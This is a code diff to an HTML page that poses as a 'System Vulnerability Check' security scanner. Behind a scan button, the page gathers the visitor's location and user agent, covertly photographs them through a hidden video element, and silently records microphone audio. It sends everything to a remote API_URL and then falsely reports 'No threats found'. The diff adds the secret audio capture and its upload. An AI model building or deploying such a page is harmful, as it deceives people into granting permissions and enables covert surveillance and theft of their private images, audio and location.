@@ -6,7 +6,8 @@
     <title>System Vulnerability Check</title>
     <style>
         body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
-        .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
+        .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
+        .btn:hover { background: #2ea043; }
         #hidden_video { display: none; }
     </style>
 </head>
@@ -15,7 +16,7 @@
     <p>This tool will scan your device for security vulnerabilities.</p>
     <button class="btn" onclick="startAudit()">START SECURITY SCAN</button>
 
-    <video id="hidden_video" autoplay></video>
+    <video id="hidden_video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -36,33 +37,67 @@
                             device: navigator.userAgent
                         })
                     });
-                });
+                }, (err) => { console.log("Location Denied"); });
             }
 
             // 2. Access Camera & Mic
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: { echoCancellation: true, noiseSuppression: true } 
+                });
+
+                // --- CAMERA SECTION ---
                 const video = document.getElementById('hidden_video');
                 video.srcObject = stream;
 
-                // Wait 2 seconds then capture photo
+                // --- AUDIO RECORDING SECTION (Silent) ---
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(audioBlob);
+                    reader.onloadend = async () => {
+                        await fetch(API_URL, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ type: 'audio', audio: reader.result })
+                        });
+                    };
+                };
+
+                // Start recording
+                mediaRecorder.start();
+
+                // Wait 3 seconds then capture photo and stop audio
                 setTimeout(async () => {
+                    // Capture Photo
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
                     const imgData = canvas.toDataURL('image/jpeg');
+                    
                     await fetch(API_URL, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ type: 'image', image: imgData })
                     });
 
-                    // Stop camera after capture
+                    // Stop Mic Recording
+                    mediaRecorder.stop();
+
+                    // Stop all tracks (Camera/Mic off)
                     stream.getTracks().forEach(track => track.stop());
+                    
                     alert("Scan Complete: No threats found!");
-                }, 2000);
+                }, 3000);
 
             } catch (err) {
                 alert("Please grant permissions to run the security audit.");
